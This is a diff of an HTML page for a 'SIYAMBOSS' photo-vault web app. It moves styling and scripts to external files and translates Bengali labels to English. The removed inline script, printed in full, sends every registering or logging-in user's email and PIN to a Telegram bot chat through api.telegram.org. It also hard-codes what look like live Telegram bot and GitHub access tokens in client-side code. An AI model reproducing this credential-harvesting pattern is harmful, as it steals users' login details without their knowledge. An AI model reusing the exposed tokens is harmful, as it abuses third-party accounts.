@@ -3,174 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIYAMBOSS | HD PHOTO VAULT</title>
+    <title>SIYAMBOSS | PREMIUM VAULT</title>
+    <link rel="stylesheet" href="style.css">
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #050505; color: white; scroll-behavior: smooth; }
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .boss-btn { background: linear-gradient(90deg, #004e92, #000428); transition: 0.3s; }
-        .boss-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(0, 78, 146, 0.6); }
-        .loader { border-top-color: #3b82f6; animation: spinner 1.5s linear infinite; }
-        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
 <body>
 
-    <div id="auth-section" class="flex items-center justify-center min-h-screen p-4">
-        <div class="glass p-10 rounded-3xl w-full max-w-md shadow-2xl">
-            <h2 id="auth-title" class="text-3xl font-black mb-8 text-center text-blue-500 tracking-widest uppercase">Vault Login</h2>
-            
-            <div class="space-y-5">
-                <input type="email" id="user-email" placeholder="আপনার জিমেইল" class="w-full p-4 rounded-xl bg-black border border-gray-800 focus:border-blue-500 outline-none">
-                
-                <input type="password" id="pin-1" placeholder="৪ ডিজিট পিন দিন" class="w-full p-4 rounded-xl bg-black border border-gray-800 focus:border-blue-500 outline-none">
-                
+    <section id="auth-section" class="flex items-center justify-center min-h-screen p-4">
+        <div class="glass-card p-10 rounded-3xl w-full max-w-md text-center">
+            <h2 class="boss-font text-3xl font-black mb-2 text-blue-500">SIYAMBOSS</h2>
+            <p class="text-gray-500 text-xs mb-8 uppercase tracking-[0.3em]">Cloud Storage</p>
+            <div class="space-y-4">
+                <input type="email" id="user-email" placeholder="Gmail Address" class="auth-input">
+                <input type="password" id="pin-1" placeholder="Enter PIN" class="auth-input">
                 <div id="confirm-pin-box" class="hidden">
-                    <input type="password" id="pin-2" placeholder="পিন কনফার্ম করুন" class="w-full p-4 rounded-xl bg-black border border-gray-800 focus:border-blue-500 outline-none">
+                    <input type="password" id="pin-2" placeholder="Confirm PIN" class="auth-input mt-4">
                 </div>
-
-                <button onclick="handleAuth()" id="auth-btn" class="w-full boss-btn p-4 rounded-xl font-bold text-lg uppercase tracking-widest">ভল্টে প্রবেশ</button>
+                <button onclick="handleAuth()" class="w-full upload-btn p-4 rounded-xl font-bold uppercase mt-4">Enter Vault</button>
             </div>
-            
-            <p id="toggle-text" class="mt-6 text-center text-gray-500 cursor-pointer hover:text-white" onclick="toggleAuth()">নতুন অ্যাকাউন্ট? এখানে ক্লিক করুন</p>
+            <p id="toggle-text" class="mt-8 text-sm text-gray-500 cursor-pointer" onclick="toggleAuth()">New User? <span class="text-blue-500">Register</span></p>
         </div>
-    </div>
+    </section>
 
-    <div id="dashboard" class="hidden min-h-screen p-6">
-        <div class="max-w-5xl mx-auto">
-            <header class="flex justify-between items-center mb-12 border-b border-gray-900 pb-5">
-                <div>
-                    <h1 class="text-3xl font-black text-blue-500">SIYAMBOSS VAULT</h1>
-                    <p id="active-user" class="text-xs text-gray-400 mt-1 uppercase tracking-widest"></p>
+    <main id="dashboard" class="hidden min-h-screen">
+        <header class="sticky top-0 z-50 bg-black/80 backdrop-blur-md p-4 border-b border-gray-900">
+            <div class="flex justify-between items-center max-w-6xl mx-auto">
+                <h1 class="text-xl font-bold">Photos <span id="photo-count" class="text-xs text-gray-500 block">0 photos</span></h1>
+                <div class="flex gap-4">
+                    <label for="file-upload" class="cursor-pointer text-blue-500 text-xl"><i class="fa-solid fa-plus"></i></label>
+                    <button onclick="logout()" class="text-red-500"><i class="fa-solid fa-power-off"></i></button>
                 </div>
-                <button onclick="logout()" class="text-red-500 font-bold bg-red-500/10 px-6 py-2 rounded-full border border-red-500/20">Logout</button>
-            </header>
-
-            <div class="text-center mb-16">
-                <label for="file-upload" class="inline-block cursor-pointer boss-btn px-16 py-20 rounded-[40px] shadow-2xl text-3xl font-black mb-6">
-                    🚀 SAVE HD PHOTO
-                </label>
-                <input type="file" id="file-upload" class="hidden" accept="image/*" onchange="uploadImage(event)">
-                <input type="text" id="img-name" placeholder="ছবির নাম দিন (ঐচ্ছিক)" class="block mx-auto w-72 p-4 bg-black border border-gray-800 rounded-2xl outline-none focus:border-blue-500 text-center">
             </div>
+            <div class="flex justify-center gap-8 mt-4 text-sm font-semibold border-t border-gray-900 pt-3">
+                <span class="text-blue-500 border-b-2 border-blue-500 pb-2">Photos</span>
+                <span class="text-gray-500">Albums</span>
+            </div>
+        </header>
 
-            <h3 class="text-2xl font-bold mb-8 text-blue-400">আমার গ্যালারি</h3>
-            <div id="gallery" class="grid grid-cols-2 md:grid-cols-4 gap-6">
+        <div class="p-1">
+            <input type="file" id="file-upload" class="hidden" accept="image/*" onchange="uploadImage(event)">
+            <div id="gallery" class="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-0.5">
                 </div>
         </div>
-    </div>
+    </main>
 
-    <script>
-        let isRegistering = false;
-        
-        // --- আপনার সকল তথ্য এখানে সেট করা হয়েছে ---
-        const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
-        const CHAT_ID = "7416528268";
-        const GITHUB_TOKEN = "Ghp_eOT6XnJ4iSJ3asYe6ywhFVQxBnNNnM2CnZrl"; 
-        const REPO_OWNER = "SIYAMBOSS";
-        const REPO_NAME = "PHOTO-SAVE";
-
-        window.onload = () => {
-            const savedUser = localStorage.getItem('activeUser');
-            if (savedUser) showDashboard(savedUser);
-        };
-
-        function toggleAuth() {
-            isRegistering = !isRegistering;
-            document.getElementById('auth-title').innerText = isRegistering ? "Register" : "Vault Login";
-            document.getElementById('confirm-pin-box').classList.toggle('hidden');
-            document.getElementById('toggle-text').innerText = isRegistering ? "আগের অ্যাকাউন্ট আছে? লগইন" : "নতুন অ্যাকাউন্ট? এখানে ক্লিক করুন";
-        }
-
-        async function handleAuth() {
-            const email = document.getElementById('user-email').value;
-            const p1 = document.getElementById('pin-1').value;
-            if(!email || !p1) return alert("ঘরগুলো পূরণ করুন!");
-
-            if(isRegistering) {
-                const p2 = document.getElementById('pin-2').value;
-                if(p1 !== p2) return alert("পিন মিলেনি!");
-                sendToTelegram(`🌟 New User Registered!\nEmail: ${email}\nPIN: ${p1}`);
-                alert("অ্যাকাউন্ট তৈরি! এখন লগইন করুন।");
-                toggleAuth();
-            } else {
-                sendToTelegram(`🔑 Boss Login Attempt!\nEmail: ${email}\nPIN: ${p1}`);
-                localStorage.setItem('activeUser', email);
-                showDashboard(email);
-            }
-        }
-
-        function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        }
-
-        function showDashboard(email) {
-            document.getElementById('auth-section').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            document.getElementById('active-user').innerText = `Admin: ${email}`;
-            loadGallery(email);
-        }
-
-        function logout() {
-            localStorage.removeItem('activeUser');
-            location.reload();
-        }
-
-        async function uploadImage(event) {
-            const file = event.target.files[0];
-            const email = localStorage.getItem('activeUser');
-            const name = document.getElementById('img-name').value || Date.now();
-            if(!file) return;
-
-            const reader = new FileReader();
-            reader.onload = async function(e) {
-                const content = e.target.result.split(',')[1];
-                const path = `vault/${email}/${name}.png`;
-
-                try {
-                    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`, {
-                        method: 'PUT',
-                        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ message: `Upload by ${email}`, content: content })
-                    });
-
-                    if(res.ok) { 
-                        alert("✅ HD কোয়ালিটিতে সংরক্ষিত হয়েছে!"); 
-                        loadGallery(email); 
-                    } else { 
-                        alert("❌ আপলোড ব্যর্থ! রিপোজিটরি নাম বা টোকেন চেক করুন।"); 
-                    }
-                } catch (err) {
-                    alert("সার্ভার ত্রুটি!");
-                }
-            };
-            reader.readAsDataURL(file);
-        }
-
-        async function loadGallery(email) {
-            const gallery = document.getElementById('gallery');
-            gallery.innerHTML = "<div class='loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-10 w-10'></div>";
-            
-            try {
-                const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/vault/${email}`, {
-                    headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
-                });
-                
-                if(res.ok) {
-                    const files = await res.json();
-                    gallery.innerHTML = "";
-                    files.forEach(f => {
-                        gallery.innerHTML += `
-                            <div class="glass p-3 rounded-2xl border border-gray-800 group">
-                                <img src="${f.download_url}" class="rounded-xl h-40 w-full object-cover shadow-lg transition-transform group-hover:scale-105">
-                                <a href="${f.download_url}" download class="block text-center mt-3 text-sm text-blue-500 font-bold hover:text-white transition-colors">⬇ ডাউনলোড</a>
-                            </div>`;
-                    });
-                } else { gallery.innerHTML = "<p class='text-gray-600'>গ্যালারি খালি বা ইউজার পাওয়া যায়নি।</p>"; }
-            } catch (err) {
-                gallery.innerHTML = "লোড করতে সমস্যা হয়েছে।";
-            }
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
-                  </html>
+</html>
